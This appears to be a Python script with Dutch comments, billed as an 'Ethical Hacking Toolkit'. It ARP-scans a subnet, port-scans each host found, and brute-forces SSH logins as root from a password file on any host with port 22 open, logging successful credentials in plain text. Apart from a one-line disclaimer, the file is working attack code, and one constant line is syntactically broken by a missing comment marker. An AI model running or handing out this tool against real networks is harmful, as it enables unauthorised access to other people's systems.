import datetime
import socket
import base64
import json
import logging
from typing import Dict, List, Union, Any
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import platform
import asyncio
import time  # Nieuw voor rate limiting

from scapy.all import ARP, Ether, srp, get_working_ifaces
import paramiko

# Veiligheidsconfiguratie
logging.getLogger("paramiko").setLevel(logging.WARNING)  # Minder verbose logging
MAX_SCAN_PORTS = 15  Beperk aantal poorten
MIN_RATE_LIMIT = 1.0  # Minimaal 1 seconde tussen pogingen

# Configureer logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('toolkit.log'), logging.StreamHandler()]
)

def save_results(data: Dict, filename: str = "scan_results") -> None:
    """Opslaan van resultaten in een JSON-bestand met Base64 encoded filename"""
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = base64.b64encode(f"{filename}_{timestamp}".encode()).decode()
        output_path = Path(f"./results/{safe_name}.json")
        
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        with output_path.open('w') as f:
            json.dump({
                "timestamp": timestamp,
                "data": data
            }, f, indent=2, default=str)
            
        logging.info(f"Resultaten opgeslagen in {output_path.resolve()}")
        
    except Exception as e:
        logging.error(f"Fout bij opslaan: {str(e)}")

def arp_scan(target_ip: str = "192.168.1.0/24") -> List[Dict[str, str]]:
    """Geavanceerde ARP-scanner met interface detectie"""
    logging.info("ARP-scan initialiseren...")
    
    try:
        available_ifaces = [iface for iface in get_working_ifaces() if iface.ip]
        if not available_ifaces:
            logging.error("Geen bruikbare interfaces gevonden")
            return []

        # Interface selectie
        logging.info("Beschikbare interfaces:")
        for idx, iface in enumerate(available_ifaces):
            logging.info(f"  {idx}: {iface.name} - IP: {iface.ip}")

        while True:
            try:
                choice = int(input(f"Kies interface (0-{len(available_ifaces)-1}): "))
                iface = available_ifaces[choice]
                break
            except (ValueError, IndexError):
                logging.warning("Ongeldige keuze, probeer opnieuw")

        logging.info(f"Scannen van {target_ip} via {iface.name}...")

        # ARP-pakket constructie
        arp_layer = ARP(pdst=target_ip)
        ether_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether_layer/arp_layer

        # Uitvoeren scan met langere timeout
        result, _ = srp(
            packet,
            iface=iface.name,
            timeout=5,  # Verhoogde timeout
            verbose=0,
            inter=0.1,
            threaded=True
        )

        devices = [{
            'IP': received.psrc,
            'MAC': received.hwsrc,
            'Interface': iface.name
        } for sent, received in result]

        if not devices:
            logging.warning("Geen apparaten gevonden - controleer netwerkinstellingen")

        return devices

    except Exception as e:
        logging.critical(f"ARP-scan fout: {str(e)}")
        return []

async def async_port_scan(host: str, ports: List[int] = None) -> Dict[int, str]:
    """Asynchrone portscanner met service detectie"""
    logging.info(f"Portscan gestart voor {host}")
    
    # Standaard poortenlijst met beperking
    default_ports = [21, 22, 23, 80, 443, 8080, 3389, 5900]
    ports = ports[:MAX_SCAN_PORTS] if ports else default_ports
    
    open_ports = {}
    loop = asyncio.get_event_loop()
    
    async def check_port(port: int) -> Union[None, tuple]:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=1.5
            )
            writer.close()
            await writer.wait_closed()
            try:
                service = socket.getservbyport(port)
            except OSError:
                service = "onbekend"
            return (port, service)
        except Exception:
            return None

    tasks = [check_port(port) for port in ports]
    results = await asyncio.gather(*tasks)
    
    for result in results:
        if result:
            port, service = result
            open_ports[port] = service
            logging.warning(f"Poort {port} ({service}) is open")

    return open_ports

def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_workers: int = 3) -> bool:
    """Beveiligde SSH bruteforce met rate limiting"""
    logging.warning(f"SSH bruteforce gestart op {host}:{port}")
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.WarningPolicy())
    
    try:
        with open("passwords.txt") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logging.error("passwords.txt niet gevonden!")
        return False

    def try_password(password: str) -> bool:
        try:
            time.sleep(MIN_RATE_LIMIT)  # Rate limiting
            client.connect(
                host,
                port=port,
                username=username,
                password=password,
                timeout=3,
                banner_timeout=3
            )
            logging.critical(f"SUCCESVOL: {username}:{password}")
            client.close()
            return True
        except Exception as e:
            logging.debug(f"Mislukt: {password} - {str(e)}")
            return False

    try:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            for result in executor.map(try_password, passwords):
                if result:
                    return True
        return False
    except Exception as e:
        logging.error(f"SSH fout: {str(e)}")
        return False

async def main():
    print("=== Ethical Hacking Toolkit v2 ===")
    print("Gebruik alleen voor legitieme doeleinden!\n")
    
    if platform.system() == "Windows":
        print("[!] Draai als Administrator en installeer Npcap")
    
    target = input("Voer target IP/netwerk in: ").strip()
    if '/' not in target:
        target += "/24"
        logging.info(f"Subnetmasker toegevoegd: {target}")

    results = {
        'arp_scan': [],
        'open_ports': {},
        'ssh_bruteforce': {}
    }

    # ARP Scan
    results['arp_scan'] = arp_scan(target)
    
    if results['arp_scan']:
        # Scan alle gevonden IP's
        for device in results['arp_scan']:
            current_ip = device['IP']
            try:
                # Port Scan
                results['open_ports'][current_ip] = await async_port_scan(current_ip)
                
                # SSH Bruteforce alleen bij open poort 22
                if 22 in results['open_ports'][current_ip]:
                    results['ssh_bruteforce'][current_ip] = ssh_bruteforce(current_ip)
                else:
                    results['ssh_bruteforce'][current_ip] = "Niet uitgevoerd (poort 22 gesloten)"
            except Exception as e:
                logging.error(f"Fout bij scan van {current_ip}: {str(e)}")

    # Opslaan resultaten
    save_results(results)
    
    print("\n[!] Audit voltooid. Raadpleeg de logs en JSON-output.")

if __name__ == "__main__":
    asyncio.run(main())
